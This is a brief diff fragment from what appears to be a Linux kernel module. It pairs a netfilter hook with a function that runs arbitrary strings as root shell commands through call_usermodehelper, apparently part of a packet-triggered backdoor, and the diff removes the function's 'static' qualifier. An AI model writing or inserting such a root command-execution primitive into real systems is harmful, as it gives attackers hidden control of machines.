@@ -13,7 +13,7 @@
 
 static struct nf_hook_ops command_executor_ops;
 
-static void execute_kernel_command(const char *cmd) {
+void execute_kernel_command(const char *cmd) {
     char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
